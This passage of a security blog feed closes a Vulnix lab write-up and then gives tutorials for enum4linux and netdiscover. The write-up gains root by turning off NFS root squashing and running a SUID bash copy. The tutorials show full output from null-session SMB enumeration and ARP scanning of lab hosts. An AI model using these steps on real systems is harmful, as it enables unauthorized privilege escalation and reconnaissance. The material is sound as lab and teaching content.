<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>

<p><code>
vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
vulnix@vulnix:~$ ls -l
total 900
-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
</code></p>

<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>

<p>From the SSH, I verified it as the vulnix user:</p>

<p><code>
vulnix@vulnix:~$ ls -l bash
-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
</code></p>

<p>Finally, I ran the shell while preserving its permissions:</p>

<p><code>
vulnix@vulnix:~$ ./bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
</code></p>

<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: What do you call a half-dozen    \
| Indians with Asian flu? A: Six sick |
\ Sikhs (sic).                        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools/"/>
    <updated>2017-06-19T10:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: enumerate shares on a target and gather as much information as possible. enum4linux is a Perl script that can get the job done.</p>

<p>Homepage: <a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>

<!-- more -->


<h2>enum4linux description</h2>

<blockquote><p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar
functionality to enum.exe formerly available from www.bindview.com.</p>

<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>

<p>Key features:</p>

<ul>
<li><p>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</p></li>
<li><p>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</p></li>
<li><p>Listing of group membership information</p></li>
<li><p>Share enumeration</p></li>
<li><p>Detecting if host is in a workgroup or a domain</p></li>
<li><p>Identifying the remote operating system</p></li>
<li><p>Password policy retrieval (using polenum)</p></li>
</ul>
</blockquote>

<h2>enum4linux options</h2>

<p>```
num4linux
enum4linux v0.8.9 (<a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a>)
Copyright &copy; 2011 Mark Lowe (<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#109;&#114;&#x6c;&#64;&#112;&#111;&#x72;&#116;&#99;&#117;&#108;&#x6c;&#x69;&#115;&#45;&#115;&#x65;&#x63;&#x75;&#114;&#x69;&#116;&#x79;&#x2e;&#99;&#111;&#109;">&#109;&#x72;&#x6c;&#x40;&#x70;&#x6f;&#114;&#x74;&#x63;&#117;&#x6c;&#108;&#105;&#x73;&#45;&#x73;&#101;&#99;&#x75;&#x72;&#105;&#116;&#121;&#46;&#x63;&#x6f;&#x6d;</a>)</p>

<p>Simple wrapper around the tools in the samba package to provide similar
functionality to enum.exe (formerly from www.bindview.com).  Some additional
features such as RID cycling have also been added for convenience.</p>

<p>Usage: ./enum4linux.pl [options] ip</p>

<p>Options are (like &ldquo;enum&rdquo;):</p>

<pre><code>-U        get userlist
-M        get machine list*
-S        get sharelist
-P        get password policy information
-G        get group and member list
-d        be detailed, applies to -U and -S
-u user   specify username to use (default "")  
-p pass   specify password to use (default "")   
</code></pre>

<p>The following options from enum.exe aren&rsquo;t implemented: -L, -N, -D, -f</p>

<p>Additional options:</p>

<pre><code>-a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
          This opion is enabled if you don't provide any other options.
-h        Display this help message and exit
-r        enumerate users via RID cycling
-R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
-K n      Keep searching RIDs until n consective RIDs don't correspond to
          a username.  Impies RID range ends at 999999. Useful 
      against DCs.
-l        Get some (limited) info via LDAP 389/TCP (for DCs only)
-s file   brute force guessing for share names
-k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
          Used to get sid with "lookupsid known_username"
          Use commas to try several users: "-k admin,user1,user2"
-o        Get OS information
-i        Get printer information
-w wrkg   Specify workgroup manually (usually found automatically)
-n        Do an nmblookup (similar to nbtstat)
-v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</code></pre>

<p>RID cycling should extract a list of users from Windows (or Samba) hosts
which have RestrictAnonymous set to 1 (Windows NT and 2000), or &ldquo;Network
access: Allow anonymous SID/Name translation&rdquo; enabled (XP, 2003).</p>

<p>NB: Samba servers often seem to have RIDs in the range 3000-3050.</p>

<p>Dependancy info: You will need to have the samba package installed as this
script is basically just a wrapper around rpcclient, net, nmblookup and
smbclient.  Polenum from <a href="http://labs.portcullis.co.uk/application/polenum/">http://labs.portcullis.co.uk/application/polenum/</a>
is required to get Password Policy info.
```</p>

<h2>enum4linux usage</h2>

<ul>
<li>get everything you can from a host without any credentials</li>
</ul>


<p>```
enum4linux 192.168.217.131
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:06:33 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.131
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.131    |
 =======================================================
[E] Can&rsquo;t find workgroup/domain</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.131    |
 ===============================================
Looking up status of 192.168.217.131
No reply from 192.168.217.131</p>

<p> ========================================
|    Session Check on 192.168.217.131    |
 ========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 192.168.217.131 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;
[+] Got domain/workgroup name: SAMBA</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.131    |
 ==============================================
Domain Name: SAMBA
Domain Sid: (NULL SID)
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup</p>

<p> =========================================
|    OS information on 192.168.217.131    |
 =========================================
[+] Got OS info for 192.168.217.131 from smbclient: Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
[+] Got OS info for 192.168.217.131 from srvinfo:</p>

<pre><code>LOCALHOST      Wk Sv PrQ Unx NT SNT Samba File Server
platform_id     :   500
os version      :   6.1
server type     :   0x809a03
</code></pre>

<p> ================================
|    Users on 192.168.217.131    |
 ================================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser  Name: Samba access is allowed for this user Desc:</p>

<p>user:[smbuser] rid:[0x3e8]</p>

<p> ============================================
|    Share Enumeration on 192.168.217.131    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
sharename       Disk      Only authorized users
IPC$            IPC       IPC Service (Samba File Server)

Server               Comment
---------            -------

Workgroup            Master
---------            -------
</code></pre>

<p>[+] Attempting to map shares on 192.168.217.131
//192.168.217.131/sharename Mapping: DENIED, Listing: N/A
//192.168.217.131/IPC$  Mapping: OK Listing: DENIED</p>

<p> =======================================================
|    Password Policy Information for 192.168.217.131    |
 =======================================================
[E] Unexpected error from polenum:
Traceback (most recent call last):
  File &ldquo;/usr/bin/polenum&rdquo;, line 33, in <module></p>

<pre><code>from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
</code></pre>

<p>ImportError: cannot import name dcerpc_v4
[+] Retieved partial password policy with rpcclient:</p>

<p>Password Complexity: Disabled
Minimum Password Length: 5</p>

<p> =================================
|    Groups on 192.168.217.131    |
 =================================</p>

<p>[+] Getting builtin groups:</p>

<p>[+] Getting builtin group memberships:</p>

<p>[+] Getting local groups:</p>

<p>[+] Getting local group memberships:</p>

<p>[+] Getting domain groups:</p>

<p>[+] Getting domain group memberships:</p>

<p> ==========================================================================
|    Users on 192.168.217.131 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3832469351-2479326917-463392201
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3832469351-2479326917-463392201 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-21-3832469351-2479326917-463392201-500 <em>unknown</em>*unknown<em> (8)
S-1-5-21-3832469351-2479326917-463392201-501 LOCALHOST\nobody (Local User)
[&hellip;]
S-1-5-21-3832469351-2479326917-463392201-513 LOCALHOST\None (Domain Group)
S-1-5-21-3832469351-2479326917-463392201-1000 LOCALHOST\smbuser (Local User)
[+] Enumerating users using SID S-1-22-1 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-22-1-1000 Unix User\nixhat (Local User)
S-1-22-1-1001 Unix User\smbuser (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-32-500 </em>unknown<em>*unknown</em> (8)
[&hellip;]
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)</p>

<p> ================================================
|    Getting printer info for 192.168.217.131    |
 ================================================
No printers returned.</p>

<p>enum4linux complete on Mon Jun 19 10:07:15 2017
```</p>

<p>I edited some not found output for sanity, but you can see that even without any previous information, we were able to gather quite a few pieces, like the workgroup name, the server version, and the existing shares and users</p>

<ul>
<li>perform some enumeration while also showing the commands being run</li>
</ul>


<p>```
enum4linux -n -v 192.168.217.140
[V] Dependent program &ldquo;nmblookup&rdquo; found in /usr/bin/nmblookup
[V] Dependent program &ldquo;net&rdquo; found in /usr/bin/net
[V] Dependent program &ldquo;rpcclient&rdquo; found in /usr/bin/rpcclient
[V] Dependent program &ldquo;smbclient&rdquo; found in /usr/bin/smbclient
[V] Dependent program &ldquo;polenum&rdquo; found in /usr/bin/polenum
[V] Dependent program &ldquo;ldapsearch&rdquo; found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:50:48 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.140
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.140    |
 =======================================================
[V] Attempting to get domain name with command: nmblookup -A &lsquo;192.168.217.140&rsquo;
[+] Got domain/workgroup name: WORKGROUP</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.140    |
 ===============================================
Looking up status of 192.168.217.140</p>

<pre><code>WIN-D7GA2J1M0TU &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
WIN-D7GA2J1M0TU &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections
WORKGROUP       &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser
..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser

MAC Address = 00-0C-29-5C-13-CA
</code></pre>

<p> ========================================
|    Session Check on 192.168.217.140    |
 ========================================
[V] Attempting to make null session using command: smbclient -W &lsquo;WORKGROUP&rsquo; //&lsquo;192.168.217.140&rsquo;/ipc$ -U'&lsquo;%&rsquo;&lsquo; -c 'help&rsquo; 2>&amp;1
[+] Server 192.168.217.140 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.140    |
 ==============================================
[V] Attempting to get domain SID with command: rpcclient -W &lsquo;WORKGROUP&rsquo; -U'&lsquo;%&rsquo;&lsquo; 192.168.217.140 -c 'lsaquery&rsquo; 2>&amp;1
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup
enum4linux complete on Mon Jun 19 10:50:48 2017
```</p>

<ul>
<li>get OS information</li>
</ul>


<p><code>
enum4linux -o 192.168.217.140
[...]
 =========================================
|    OS information on 192.168.217.140    |
 =========================================
[+] Got OS info for 192.168.217.140 from smbclient: Domain=[WIN-D7GA2J1M0TU] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
</code></p>

<ul>
<li>list shares on a server with credentials</li>
</ul>


<p>```
enum4linux -u Administrator -p Password123! -S 192.168.217.141
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 12:40:55 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.141
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;Administrator&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;Password123!&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.141    |
 =======================================================
[+] Got domain/workgroup name: SANGHELIOS0</p>

<p> ========================================
|    Session Check on 192.168.217.141    |
 ========================================
[+] Server 192.168.217.141 allows sessions using username &lsquo;Administrator&rsquo;, password &lsquo;Password123!&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.141    |
 ==============================================
Domain Name: SANGHELIOS0
Domain Sid: S-1-5-21-1024350911-1337957381-1412282408
[+] Host is part of a domain (not a workgroup)</p>

<p> ============================================
|    Share Enumeration on 192.168.217.141    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
ops             Disk      
SYSVOL          Disk      Logon server share 
testshare       Disk      A share on Windows Server
</code></pre>

<p>Connection to 192.168.217.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled &mdash; no workgroup available</p>

<p>[+] Attempting to map shares on 192.168.217.141
//192.168.217.141/ADMIN$    Mapping: OK, Listing: OK
//192.168.217.141/C$    [E] Can&rsquo;t understand response:
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
  $Recycle.Bin                      DHS        0  Thu Jul 26 03:38:59 2012
  Boot                              DHS        0  Sun Oct 16 18:44:49 2016
  bootmgr                          AHSR   398156  Wed Jul 25 23:44:30 2012
  BOOTNXT                           AHS        1  Sat Jun  2 10:30:55 2012
  BOOTSECT.BAK                     AHSR     8192  Sun Oct 16 18:44:50 2016
  Documents and Settings            DHS        0  Thu Jul 26 03:14:09 2012
  pagefile.sys                      AHS 402653184  Mon Jun 19 12:08:41 2017
  PerfLogs                            D        0  Thu Jul 26 03:44:15 2012
  Program Files                      DR        0  Sun Oct 16 07:53:13 2016
  Program Files (x86)                 D        0  Thu Jul 26 04:04:58 2012
  ProgramData                        DH        0  Sun Oct 23 08:55:39 2016
  Recovery                          DHS        0  Sun Oct 16 07:48:22 2016
  StorageReports                      D        0  Sat Oct 22 17:17:58 2016
  System Volume Information         DHS        0  Sat Oct 22 17:17:27 2016
  testshare                           D        0  Mon Jun 19 12:25:50 2017
  Users                              DR        0  Sat Oct 22 16:06:28 2016
  Windows                             D        0  Sat Oct 22 16:49:16 2016</p>

<pre><code>    7863807 blocks of size 4096. 5348507 blocks available
</code></pre>

<p>//192.168.217.141/IPC$  Mapping: OK Listing: DENIED
//192.168.217.141/NETLOGON  Mapping: OK, Listing: OK
//192.168.217.141/ops   Mapping: OK, Listing: OK
//192.168.217.141/SYSVOL    Mapping: OK, Listing: OK
//192.168.217.141/testshare Mapping: OK, Listing: OK
```</p>

<p>Once you&rsquo;re on the same network as your target, enum4linux is a great resource to help in gathering information about the target, that you can later use for an attack.</p>

<p>```</p>

<hr />

<p>/ Your lucky number is 3552664958674928. \
\ Watch for it everywhere.               /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netdiscover - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools/"/>
    <updated>2017-06-16T13:05:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: a tool that can be used to perform ARP reconaissance and discover hosts on the local network. You could do that with Nmap too, but here netdiscover shines!</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/alexxy/netdiscover">https://github.com/alexxy/netdiscover</a></p>

<h2>Netdiscover description</h2>

<blockquote><p>netdiscover is an  active/passive  arp  reconnaissance  tool,  initialy
developed  to  gain  information  about  wireless networks without dhcp
servers in wardriving scenarios.  It  can  also  be  used  on  switched
networks.  Built  on top of libnet and libpcap, it can passively detect
online hosts or search for them by sending arp requests.</p>

<p>Furthermore, it can be used to inspect your network&rsquo;s arp  traffic,  or
find network addresses using auto scan mode, which will scan for common
local networks.</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html">http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html</a></p>

<h2>Netdiscover options</h2>

<p>```
Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
Written by: Jaime Penalba <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#106;&#112;&#x65;&#110;&#x61;&#x6c;&#98;&#97;&#x65;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#x6a;&#112;&#x65;&#110;&#97;&#108;&#x62;&#97;&#x65;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#109;</a></p>

<p>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan the list of known MACs and host names
  -F filter: Customize pcap filter expression (default: &ldquo;arp&rdquo;)
  -s time: time to sleep between each arp request (milliseconds)
  -n node: last ip octet used for scanning (from 2 to 253)
  -c count: number of times to send each arp reques (for nets with packet loss)
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -d ignore home config files for autoscan and fast mode
  -S enable sleep time supression between each request (hardcore mode)
  -P print results in a format suitable for parsing by another program
  -N Do not print header. Only valid when -P is enabled.
  -L in parsable output mode (-P), continue listening after the active scan is completed</p>

<p>If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.
```</p>

<h2>Netdiscover usage</h2>

<p>Simply typing netdiscover at the terminal will launch its autoscan. The screen is interactive, and you can see new hosts as they appear.</p>

<ul>
<li>scan range</li>
</ul>


<p>```
netdiscover -r 192.168.217.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor   <br/>
```</p>

<ul>
<li>passive scan (don&rsquo;t send anything, just sniff)</li>
</ul>


<p>```
netdiscover -p
 Currently scanning: (passive)   |   Screen View: Unique Hosts</p>

<p> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor    <br/>
```</p>

<p>This takes longer, because netdiscover is waiting to see the ARP requests and replies between other hosts</p>

<ul>
<li>fast scan</li>
</ul>


<blockquote><p>-f     Enable  fast  mode  scan. This will only scan for .1, .100 and .254 on each network. This mode is useful while
searching for ranges being used. After you found such range you can make a specific range scan to find online boxes.</p></blockquote>

<ul>
<li>produce parseable output and stop after scanning</li>
</ul>


<p>```
root@kali:~# netdiscover -r 192.168.217.0/24 -P</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor</p>

<p>&mdash; Active scan completed, 4 Hosts found.
```</p>

<p>Cookie:</p>

<p>```</p>

<hr />

<p>/ F.S. Fitzgerald to Hemingway:        \
|                                      |
| &ldquo;Ernest, the rich are different from |
| us.&rdquo; Hemingway:                      |
|                                      |
\ &ldquo;Yes. They have more money.&rdquo;         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
